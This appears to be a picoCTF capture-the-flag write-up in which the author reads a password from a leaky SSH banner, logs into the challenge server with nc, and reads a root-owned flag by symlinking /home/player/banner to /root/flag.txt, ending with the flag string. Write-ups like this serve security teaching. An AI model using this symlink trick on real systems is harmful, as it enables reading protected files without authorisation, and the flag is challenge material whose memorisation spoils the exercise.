# Solution:

Running on the leaky port `nc tethys.picoctf.net 50801` gives the output `SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234`. Then, we return to the main system. Running `nc tethys.picoctf.net 50482` gives the following exchange:


```
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ 
```
thereby achieving access to the server. Now, there isn't anything useful in the `~` folder, but navigating to the `/root` folder gives us `script.py`, and a `flag.txt`. Unfortunately, both of these files are locked without read/write on `flag.txt`, and without `write` for `script.py`. 
```
player@challenge:/root$ chmod +rwx flag.txt
chmod +rwx flag.txt
chmod: changing permissions of 'flag.txt': Operation not permitted
```

Instead, to finish, we rely on Hint 1, "Do you know about symlinks?". Observe that in `script.py`, the function reads in `/home/player/banner`
```
if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")
```

By first deleting a banner, and then creating a symbolic link with the command `ln -s /root/flag.txt /home/player/banner`, when we exit and reboot again, the server reads in and displays the contents of `flag.txt`, namely `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}`. 